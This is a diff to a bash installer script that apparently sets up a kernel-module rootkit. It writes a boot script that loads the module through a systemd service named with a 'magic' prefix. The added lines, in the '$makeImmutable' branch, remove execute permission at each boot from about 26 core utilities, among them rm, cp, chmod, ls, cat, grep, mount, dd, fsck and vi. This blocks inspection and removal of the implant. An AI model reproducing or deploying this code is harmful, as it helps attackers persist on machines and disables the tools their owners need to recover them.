@@ -35,7 +35,32 @@ if test -f "$koFile"; then
     echo "#!/bin/bash" >> boot.sh
     echo "insmod $thisDirPath/$koFile" >> boot.sh
     if $makeImmutable; then
-        echo "$trovePath/chmod +x /usr/bin/*" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/rm" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/cp" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/chmod" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/mkdir" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/nano" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/touch" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/mv" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/rmdir" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/grep" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/egrep" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/sed" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/cat" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/lsattr" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/ls" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/mount" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/dd" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/fdisk" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/fsck" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/parted" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/mkfs" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/lsblk" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/df" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/rsynch" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/stat" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/awk" >> boot.sh
+        echo "$trovePath/chmod -x /usr/bin/vi" >> boot.sh
     fi
     bootPath="$thisDirPath/boot.sh"
     bootServicePath="/etc/systemd/system/""$magicPrefix""load.service"
